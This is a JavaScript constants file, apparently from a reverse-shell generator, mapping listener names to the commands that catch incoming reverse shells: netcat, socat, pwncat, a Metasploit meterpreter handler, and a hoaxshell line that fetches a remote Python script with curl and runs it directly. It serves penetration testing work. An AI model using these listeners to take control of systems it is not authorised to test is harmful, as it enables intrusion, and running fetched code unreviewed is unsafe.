export const LISTENER_TYPES = [
  { label: 'Busybox Netcat', value: 'busybox nc' },
  { label: 'Netcat', value: 'nc' },
  { label: 'Netcat FreeBSD', value: 'nc freebsd' },
  { label: 'NCat', value: 'ncat' },
  { label: 'NCat.exe', value: 'ncat.exe' },
  { label: 'NCat (TLS)', value: 'ncat (TLS)' },
  { label: 'RLWRAP + Netcat', value: 'rlwrap + nc' },
  { label: 'Rustcat', value: 'rustcat' },
  { label: 'PWNCat', value: 'pwncat' },
  { label: 'Windows ConPty', value: 'windows ConPty' },
  { label: 'Socat', value: 'socat' },
  { label: 'Socat (TTY)', value: 'socat (TTY)' },
  { label: 'Powercat', value: 'powercat' },
  { label: 'MSFConsole', value: 'msfconsole' },
  { label: 'Hoaxshell', value: 'hoaxshell' }
]

export const LISTENER_COMMANDS = [
  { key: 'nc', value: 'nc -lvnp {port}' },
  { key: 'nc freebsd', value: 'nc -lvn {port}' },
  { key: 'busybox nc', value: 'busybox nc -lp {port}' },
  { key: 'ncat', value: 'ncat -lvnp {port}' },
  { key: 'ncat.exe', value: 'ncat.exe -lvnp {port}' },
  { key: 'ncat (TLS)', value: 'ncat --ssl -lvnp {port}' },
  { key: 'rlwrap + nc', value: 'rlwrap -cAr nc -lvnp {port}' },
  { key: 'rustcat', value: 'rcat listen {port}' },
  { key: 'pwncat', value: 'python3 -m pwncat -lp {port}' },
  { key: 'windows ConPty', value: 'stty raw -echo; (stty size; cat) | nc -lvnp {port}' },
  { key: 'socat', value: 'socat -d -d TCP-LISTEN:{port} STDOUT' },
  { key: 'socat (TTY)', value: 'socat -d -d file:`tty`:raw:echo=0 TCP-LISTEN:{port}' },
  { key: 'powercat', value: 'powercat -l -p {port}' },
  {
    key: 'msfconsole',
    value:
      'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost {ip}; set lport {port}; exploit"'
  },
  {
    key: 'hoaxshell',
    value:
      'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t {type} -p {port}'
  }
]
